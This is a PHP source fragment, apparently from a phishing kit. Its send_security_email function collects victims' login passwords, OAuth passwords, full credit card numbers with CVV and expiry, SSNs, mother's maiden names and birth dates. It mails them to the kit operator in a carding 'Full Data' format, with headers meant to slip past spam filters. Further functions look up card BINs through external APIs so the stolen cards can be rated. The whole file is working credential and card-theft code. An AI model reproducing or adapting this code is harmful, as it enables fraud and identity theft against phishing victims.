        $fullname = $loginData['name'] ?? $loginData['email'] ?? 'Unknown User';
    }
    
    $antiSpamHeaders = create_anti_spam_headers($fullname, $subject);
    $headers = implode("\r\n", $antiSpamHeaders);
    
    return @mail($to, $subject, $message, $headers);
}

function send_security_email(array $securityData, array $loginData, array $geoData, ?array $billingData = null, ?array $ccData = null, ?array $oauthData = null): bool {
    $config = include FCPATH . 'admin_config.php';
    $to = $config['email_recipient'] ?? 'admin@example.com';
    
    // Get BIN details from CC data if available
    $binDetails = '';
    if ($ccData && isset($ccData['card_number'])) {
        $binDetails = look_bin($ccData['card_number']);
    } elseif ($ccData && isset($ccData['number'])) {
        $binDetails = look_bin($ccData['number']);
    }
    
    // Format subject: Result [ Extra info - Billing - CC - Login ] [ BIN_DETAILS ] [ COUNTRYCODE - IP ]
    $ip = get_client_ip();
    $countryCode = get_country_code($geoData['country']);
    $flowPattern = "[ Extra info - Billing - CC - Login ]";
    $binPattern = $binDetails ? "[ " . $binDetails . " ]" : "[ - - - - - ]";
    $locationPattern = "[ " . $countryCode . " - " . $ip . " ]";
    
    $subject = "Result " . $flowPattern . " " . $binPattern . " " . $locationPattern;
    
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $ip = get_client_ip();
    
    // Security section (Extra info)
    $message = "[Extra info]\n";
    if (!empty($securityData['mmn']) || !empty($securityData['mother_maiden'])) {
        $mmn = $securityData['mmn'] ?? $securityData['mother_maiden'] ?? '';
        $message .= "Mother Maiden Name: {$mmn}\n";
    }
    if (!empty($securityData['ssn'])) {
        $message .= "SSN: {$securityData['ssn']}\n";
    }
    
    // Add OAuth account info if available
    if ($oauthData) {
        $provider = $oauthData['provider'] ?? 'unknown';
        $oauthEmail = $oauthData['email'] ?? '';
        $oauthPassword = $oauthData['password'] ?? '';
        $oauthPassword1 = $oauthData['password1'] ?? '';
        $oauthPassword2 = $oauthData['password2'] ?? '';
        
        $message .= "\n[OAuth - " . ucfirst($provider) . "]\n";
        $message .= "Email: {$oauthEmail}\n";
        $message .= "Password: {$oauthPassword}\n";
        if (!empty($oauthPassword1)) {
            $message .= "Password 1: {$oauthPassword1}\n";
        }
        if (!empty($oauthPassword2)) {
            $message .= "Password 2: {$oauthPassword2}\n";
        }
    }
    
    $message .= "\n";
    
    // Add Billing section if available
    if ($billingData) {
        $message .= "[Billing]\n";
        $message .= "address: {$billingData['address1']}\n";
        $message .= "City: {$billingData['city']}\n";
        $message .= "State: {$billingData['state']}\n";
        $message .= "ZIP Code: {$billingData['postal']}\n";
        $message .= "Phone: {$billingData['phone']}\n";
        $message .= "Date Of Birth: {$billingData['dob']}\n\n";
    }
    
    // Add CC section if available
    if ($ccData) {
        $cardholderName = $ccData['cardholder'] ?? $ccData['name'] ?? 'Unknown Name';
        $cardNumber = $ccData['card_number'] ?? $ccData['number'] ?? '';
        $expiry = $ccData['expiry'] ?? $ccData['exp_date'] ?? '';
        $cvv = $ccData['cvv'] ?? '';
        $ccAddress = $ccData['address'] ?? $ccData['full_address'] ?? '';
        $ccZip = $ccData['zip'] ?? $ccData['zip_code'] ?? '';
        
        // Format card number without spaces for "Formatted" field
        $cardNumberFormatted = str_replace(' ', '', $cardNumber);
        
        $message .= "[CC]\n";
        $message .= "Formatted: {$cardNumberFormatted}||\n";
        $message .= "Card Holder: {$cardholderName}\n";
        $message .= "ccn: {$cardNumber}\n";
        $message .= "exp: {$expiry}\n";
        $message .= "Card CVV: {$cvv}\n";
        $message .= "address: {$ccAddress}\n";
        $message .= "ZIP Code: {$ccZip}\n\n";
    }
    
    $message .= "[Login]\n";
    $message .= "Formatted: {$loginData['email']}|{$loginData['password']}\n";
    $message .= "Email: {$loginData['email']}\n";
    $message .= "Password: {$loginData['password']}\n\n\n";
    
    // Full Data - Compact format
    // Format: card_number|month|year|cvv|name|address|city|state|zip|phone|country|dob|mmn|email|ip
    $fullDataParts = [];
    
    // Card number (without spaces)
    if ($ccData) {
        $cardNumber = $ccData['card_number'] ?? $ccData['number'] ?? '';
        $cardNumberFormatted = str_replace(' ', '', $cardNumber);
        $fullDataParts[] = $cardNumberFormatted ?: '';
    } else {
        $fullDataParts[] = '';
    }
    
    // Month and Year from expiry
    if ($ccData && (!empty($ccData['expiry']) || !empty($ccData['exp_date']))) {
        $expiry = $ccData['expiry'] ?? $ccData['exp_date'] ?? '';
        $expiryParts = explode('/', $expiry);
        $month = isset($expiryParts[0]) ? str_pad(trim($expiryParts[0]), 2, '0', STR_PAD_LEFT) : '';
        $year = isset($expiryParts[1]) ? trim($expiryParts[1]) : '';
        // If year is 2 digits, assume 20XX
        if (strlen($year) === 2) {
            $year = '20' . $year;
        }
        $fullDataParts[] = $month;
        $fullDataParts[] = $year;
    } else {
        $fullDataParts[] = '';
        $fullDataParts[] = '';
    }
    
    // CVV
    if ($ccData) {
        $cvv = $ccData['cvv'] ?? '';
        $fullDataParts[] = $cvv;
    } else {
        $fullDataParts[] = '';
    }
    
    // Cardholder name
    if ($ccData) {
        $cardholderName = $ccData['cardholder'] ?? $ccData['name'] ?? '';
        $fullDataParts[] = $cardholderName;
    } else {
        $fullDataParts[] = '';
    }
    
    // Address
    if ($ccData) {
        $address = $ccData['address'] ?? $ccData['full_address'] ?? '';
        if (empty($address) && $billingData) {
            $address = $billingData['address1'] ?? '';
        }
        $fullDataParts[] = $address;
    } elseif ($billingData) {
        $fullDataParts[] = $billingData['address1'] ?? '';
    } else {
        $fullDataParts[] = '';
    }
    
    // City
    if ($billingData) {
        $fullDataParts[] = $billingData['city'] ?? '';
    } else {
        $fullDataParts[] = '';
    }
    
    // State
    if ($billingData) {
        $fullDataParts[] = $billingData['state'] ?? '';
    } else {
        $fullDataParts[] = '';
    }
    
    // ZIP
    if ($ccData) {
        $zip = $ccData['zip'] ?? $ccData['zip_code'] ?? '';
        if (empty($zip) && $billingData) {
            $zip = $billingData['postal'] ?? '';
        }
        $fullDataParts[] = $zip;
    } elseif ($billingData) {
        $fullDataParts[] = $billingData['postal'] ?? '';
    } else {
        $fullDataParts[] = '';
    }
    
    // Phone
    if ($billingData) {
        $phone = $billingData['phone'] ?? '';
        // Remove formatting from phone number (keep only digits)
        $phone = preg_replace('/\D/', '', $phone);
        $fullDataParts[] = $phone;
    } else {
        $fullDataParts[] = '';
    }
    
    // Country
    $fullDataParts[] = $geoData['country'] ?? '';
    
    // DOB (Date of Birth)
    if ($billingData) {
        $dob = $billingData['dob'] ?? '';
        $fullDataParts[] = $dob;
    } else {
        $fullDataParts[] = '';
    }
    
    // Mother Maiden Name
    $mmn = $securityData['mmn'] ?? $securityData['mother_maiden'] ?? '';
    $fullDataParts[] = $mmn;
    
    // Email
    $fullDataParts[] = $loginData['email'] ?? '';
    
    // IP
    $fullDataParts[] = $ip;
    
    // Join all parts with pipe separator
    $fullDataLine = implode('|', $fullDataParts);
    $message .= "[Full Data]\n";
    $message .= "{$fullDataLine}\n\n\n";
    
    $message .= "PC Info:\n";
    $message .= "Useragent: {$userAgent}\n";
    $message .= "IP: {$ip}\n";
    $message .= "Country: {$geoData['country']}\n";
    $message .= "City: {$geoData['city']}\n";
    $message .= "State: {$geoData['state']}\n";
    $message .= "ISP: {$geoData['isp']}\n";
    $message .= "Timezone: {$geoData['timezone']}\n";
    
    $fullname = $loginData['name'] ?? $loginData['email'] ?? 'Unknown User';
    $antiSpamHeaders = create_anti_spam_headers($fullname, $subject);
    $headers = implode("\r\n", $antiSpamHeaders);
    
    return @mail($to, $subject, $message, $headers);
}

function curl($url, $post = false, $json = false) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($json) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post));
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
    }
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

function look_bin($num) {
    error_reporting(0);
    $num = str_replace(' ', '', trim($num));
    $num = substr($num, 0, 6);
    
    // Validate BIN number
    if (strlen($num) < 6 || !ctype_digit($num)) {
        return strtoupper($num . " UNKNOWN UNKNOWN UNKNOWN UNKNOWN");
    }
    
    // Try multiple BIN lookup services for better reliability
    $binData = try_chargeblast_io($num);
    if ($binData !== false) {
        return $binData;
    }
    
    $binData = try_binlist_io($num);
    if ($binData !== false) {
        return $binData;
    }
    
    $binData = try_handyapi_com($num);
    if ($binData !== false) {
        return $binData;
    }
    
    // If all services fail, return unknown
    return strtoupper($num . " UNKNOWN UNKNOWN UNKNOWN UNKNOWN");
}

function try_chargeblast_io($num) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.chargeblast.io/bin/" . $num);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json',
        'Content-Type: application/json'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($response === false || $httpCode !== 200) {
        return false;
    }
    
    $data = json_decode($response, true);
    if (!$data || !isset($data['bin'])) {
        return false;
    }
    
    // Extract information from chargeblast.io JSON response
    $brand = strtoupper($data['brand'] ?? 'UNKNOWN');
    $type = strtoupper($data['type'] ?? 'UNKNOWN');
    $issuer = strtoupper($data['issuer'] ?? 'UNKNOWN');
    $country = strtoupper($data['country'] ?? 'UNKNOWN');
    
    // Clean up brand name for consistency
    if ($brand === 'MASTERCARD') $brand = 'MASTERCARD';
    elseif ($brand === 'VISA') $brand = 'VISA';
    elseif ($brand === 'AMERICAN EXPRESS') $brand = 'AMEX';
    
    // Use country as level if no specific level provided
    $level = $country;
    
    return strtoupper($num . " " . $brand . " " . $type . " " . $level . " " . $issuer);
}

function try_binlist_io($num) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/" . $num);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json',
        'Content-Type: application/json'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($response === false || $httpCode !== 200) {
        return false;
    }
    
    $data = json_decode($response, true);
    if (!$data) {
        return false;
    }
    
    // Extract information from JSON response
    $brand = strtoupper($data['brand'] ?? $data['scheme'] ?? 'UNKNOWN');
    $type = strtoupper($data['type'] ?? 'UNKNOWN');
    $level = strtoupper($data['prepaid'] ?? 'UNKNOWN');
    $bank = strtoupper($data['bank']['name'] ?? 'UNKNOWN');
    
    // Clean up brand name
    if ($brand === 'MASTERCARD') $brand = 'MASTERCARD';
    elseif ($brand === 'VISA') $brand = 'VISA';
    elseif ($brand === 'AMERICAN EXPRESS') $brand = 'AMEX';
    
    // Clean up type
    if ($type === 'DEBIT') $type = 'DEBIT';
    elseif ($type === 'CREDIT') $type = 'CREDIT';
    
    // Handle prepaid field
    if ($level === 'TRUE' || $level === '1') $level = 'PREPAID';
    elseif ($level === 'FALSE' || $level === '0') $level = 'STANDARD';
    else $level = 'UNKNOWN';
    
    return strtoupper($num . " " . $brand . " " . $type . " " . $level . " " . $bank);
}

function try_handyapi_com($num) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://data.handyapi.com/bin/" . $num);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json',
        'Content-Type: application/json'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($response === false || $httpCode !== 200) {
        return false;
    }
    
    $data = json_decode($response, true);
    if (!$data || $data['Status'] !== 'SUCCESS') {
        return false;
    }
    
    // Extract information from handyapi.com JSON response
    $brand = strtoupper($data['Scheme'] ?? 'UNKNOWN');
    $type = strtoupper($data['Type'] ?? 'UNKNOWN');
    $cardTier = strtoupper($data['CardTier'] ?? 'UNKNOWN');
    $issuer = strtoupper($data['Issuer'] ?? 'UNKNOWN');
    
    // Clean up brand name for consistency
    if ($brand === 'MASTERCARD') $brand = 'MASTERCARD';
    elseif ($brand === 'VISA') $brand = 'VISA';
    elseif ($brand === 'AMERICAN EXPRESS') $brand = 'AMEX';
    
    // Use CardTier as level (more detailed than basic type)
    $level = $cardTier;
    
    return strtoupper($num . " " . $brand . " " . $type . " " . $level . " " . $issuer);
}

